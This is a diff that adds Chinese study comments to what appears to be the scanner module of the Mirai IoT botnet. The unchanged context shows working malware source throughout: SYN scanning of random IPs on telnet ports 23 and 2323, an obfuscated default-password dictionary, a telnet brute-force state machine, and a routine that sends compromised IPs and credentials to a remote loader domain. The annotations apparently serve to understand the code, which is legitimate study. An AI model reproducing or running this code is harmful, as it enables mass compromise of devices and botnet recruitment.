@@ -54,6 +54,8 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     return ret;
 }
 
+
+//扫描子进程
 void scanner_init(void)
 {
     int i;
@@ -62,11 +64,13 @@ void scanner_init(void)
     struct tcphdr *tcph;
 
     // Let parent continue on main thread
-    scanner_pid = fork();
-    if (scanner_pid > 0 || scanner_pid == -1)
+    scanner_pid = fork();  //返回子进程的id
+    if (scanner_pid > 0 || scanner_pid == -1)//父进程直接return
         return;
 
     LOCAL_ADDR = util_local_addr();
+
+    //生成随机IP，然后利用字典进行爆破
 
     rand_init();
     fake_time = time(NULL);
@@ -120,7 +124,7 @@ void scanner_init(void)
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    // Set up passwords
+    // Set up passwords    弱口令字典
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
@@ -197,11 +201,11 @@ void scanner_init(void)
         struct timeval tim;
         int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
 
-        // Spew out SYN to try and get a response
+        // Spew out SYN to try and get a response    大量发送syn flood
         if (fake_time != last_spew)
         {
             last_spew = fake_time;
-
+            // 160
             for (i = 0; i < SCANNER_RAW_PPS; i++)
             {
                 struct sockaddr_in paddr = {0};
@@ -210,10 +214,11 @@ void scanner_init(void)
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
-                iph->daddr = get_random_ip();
+                iph->daddr = get_random_ip();//生成随机IP，并且排除一些特殊IP
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
+                /*对2323端口和23端口进行syn flood     为啥？？*/
                 if (i % 10 == 0)
                 {
                     tcph->dest = htons(2323);
@@ -245,17 +250,18 @@ void scanner_init(void)
             struct scanner_connection *conn;
 
             errno = 0;
-            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
+            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);//读取返回的包
             if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                 break;
 
+            /*将非法包过滤   */
             if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                 continue;
             if (iph->daddr != LOCAL_ADDR)
                 continue;
             if (iph->protocol != IPPROTO_TCP)
                 continue;
-            if (tcph->source != htons(23) && tcph->source != htons(2323))
+            if (tcph->source != htons(23) && tcph->source != htons(2323))//为啥只要23端口和2323端口的包呢。。。
                 continue;
             if (tcph->dest != source_port)
                 continue;
@@ -281,14 +287,14 @@ void scanner_init(void)
                 }
             }
 
-            // If there were no slots, then no point reading any more
+            // If there were no slots, then no point reading any more      slots 槽
             if (conn == NULL)
                 break;
 
             conn->dst_addr = iph->saddr;
             conn->dst_port = tcph->source;
             setup_connection(conn);
-#ifdef DEBUG
+#ifdef DEBUG    /*brute found 暴力查找*/
             printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
 #endif
         }
@@ -296,7 +302,7 @@ void scanner_init(void)
         // Load file descriptors into fdsets
         FD_ZERO(&fdset_rd);
         FD_ZERO(&fdset_wr);
-        for (i = 0; i < SCANNER_MAX_CONNS; i++)
+        for (i = 0; i < SCANNER_MAX_CONNS; i++)//128
         {
             int timeout;
 
@@ -442,6 +448,7 @@ void scanner_init(void)
                     conn->rdbuf_pos += ret;
                     conn->last_recv = fake_time;
 
+                    /*进入状态机*/
                     while (TRUE)
                     {
                         int consumed = 0;
@@ -453,12 +460,12 @@ void scanner_init(void)
                             {
                                 conn->state = SC_WAITING_USERNAME;
 #ifdef DEBUG
-                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
+                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);  //negotiation 协商
 #endif
                             }
                             break;
                         case SC_WAITING_USERNAME:
-                            if ((consumed = consume_user_prompt(conn)) > 0)
+                            if ((consumed = consume_user_prompt(conn)) > 0)//提示输入用户名
                             {
                                 send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
@@ -469,7 +476,7 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_PASSWORD:
-                            if ((consumed = consume_pass_prompt(conn)) > 0)
+                            if ((consumed = consume_pass_prompt(conn)) > 0)//提示输入密码
                             {
 #ifdef DEBUG
                                 printf("[scanner] FD%d received password prompt\n", conn->fd);
@@ -483,7 +490,7 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_PASSWD_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
+                            if ((consumed = consume_any_prompt(conn)) > 0)  //prompt  提示
                             {
                                 char *tmp_str;
                                 int tmp_len;
@@ -579,7 +586,7 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_TOKEN_RESP:
-                            consumed = consume_resp_prompt(conn);
+                            consumed = consume_resp_prompt(conn);//判断是否登录成功
                             if (consumed == -1)
                             {
 #ifdef DEBUG
@@ -602,14 +609,14 @@ void scanner_init(void)
 #endif
                                 }
                             }
-                            else if (consumed > 0)
+                            else if (consumed > 0)//已经用此用户名和密码登录成功
                             {
                                 char *tmp_str;
                                 int tmp_len;
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
-#endif
-                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
+#endif                          /*向loader报告*/
+                                report_working(conn->dst_addr, conn->dst_port, conn->auth);//auth即用户名和密码等信息
                                 close(conn->fd);
                                 conn->fd = -1;
                                 conn->state = SC_CLOSED;
@@ -640,10 +647,11 @@ void scanner_init(void)
 
 void scanner_kill(void)
 {
-    kill(scanner_pid, 9);
+    kill(scanner_pid, 9);//scanner_pid是fork的父进程的返回值，即子进程的ID
 }
 
 //建立连接？？？？　　bot 与　bot 间需要建立链接么？
+//是的，先建立连接然后才用telnet登录
 static void setup_connection(struct scanner_connection *conn)
 {
     struct sockaddr_in addr = {0};
@@ -766,6 +774,8 @@ static int consume_iacs(struct scanner_connection *conn)
     return consumed;
 }
 
+
+//判断有没有提示信息  从接收缓存中的结尾处开始判断
 static int consume_any_prompt(struct scanner_connection *conn)
 {
     char *pch;
@@ -786,6 +796,7 @@ static int consume_any_prompt(struct scanner_connection *conn)
         return prompt_ending;
 }
 
+/*consume 消费，吸收    这里翻译成接收到，即接收到用户提示*/
 static int consume_user_prompt(struct scanner_connection *conn)
 {
     char *pch;
@@ -799,7 +810,7 @@ static int consume_user_prompt(struct scanner_connection *conn)
             break;
         }
     }
-
+    /*没找到最后一个提示符*/
     if (prompt_ending == -1)
     {
         int tmp;
@@ -809,13 +820,14 @@ static int consume_user_prompt(struct scanner_connection *conn)
         else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
             prompt_ending = tmp;
     }
-
+    /*而且没找到login或者enter提示符*/
     if (prompt_ending == -1)
         return 0;
     else
         return prompt_ending;
 }
 
+/*判断是否接收到密码提示信息*/
 static int consume_pass_prompt(struct scanner_connection *conn)
 {
     char *pch;
@@ -833,7 +845,7 @@ static int consume_pass_prompt(struct scanner_connection *conn)
     if (prompt_ending == -1)
     {
         int tmp;
-
+        /*为啥不搜索完整的"password"??*/
         if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
             prompt_ending = tmp;
     }
@@ -844,13 +856,15 @@ static int consume_pass_prompt(struct scanner_connection *conn)
         return prompt_ending;
 }
 
+
+/*没看懂*/
 static int consume_resp_prompt(struct scanner_connection *conn)
 {
     char *tkn_resp;
     int prompt_ending, len;
 
-    table_unlock_val(TABLE_SCAN_NCORRECT);
-    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
+    table_unlock_val(TABLE_SCAN_NCORRECT);//解密
+    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);//密码错误
     if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
     {
         table_lock_val(TABLE_SCAN_NCORRECT);
@@ -859,7 +873,7 @@ static int consume_resp_prompt(struct scanner_connection *conn)
     table_lock_val(TABLE_SCAN_NCORRECT);
 
     table_unlock_val(TABLE_SCAN_RESP);
-    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
+    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);//utf8 version of query string 啥意思？？？
     prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
     table_lock_val(TABLE_SCAN_RESP);
 
@@ -903,10 +917,10 @@ static struct scanner_auth *random_auth_entry(void)
 static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
 {
     struct sockaddr_in addr;
-    int pid = fork(), fd;
+    int pid = fork(), fd;  //又fork了一个进程
     struct resolv_entries *entries = NULL;
 
-    if (pid > 0 || pid == -1)
+    if (pid > 0 || pid == -1)//父进程直接return
         return;
 
     if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
@@ -917,8 +931,8 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         exit(0);
     }
 
-    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
-    table_unlock_val(TABLE_SCAN_CB_PORT);
+    table_unlock_val(TABLE_SCAN_CB_DOMAIN);//loader的域名
+    table_unlock_val(TABLE_SCAN_CB_PORT);//loader的端口  48101
 
     entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
     if (entries == NULL)
@@ -933,23 +947,23 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
     resolv_entries_free(entries);
 
-    table_lock_val(TABLE_SCAN_CB_DOMAIN);
+    table_lock_val(TABLE_SCAN_CB_DOMAIN);//加密
     table_lock_val(TABLE_SCAN_CB_PORT);
 
-    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)//连接loader
     {
 #ifdef DEBUG
-        printf("[report] Failed to connect to scanner callback!\n");
+        printf("[report] Failed to connect to scanner callback!\n");//为啥叫canner callback
 #endif
         close(fd);
         exit(0);
     }
 
     uint8_t zero = 0;
-    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);//发送zero干啥
     send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
     send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
-    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);    //发送length干啥？？？
     send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
     send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
     send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
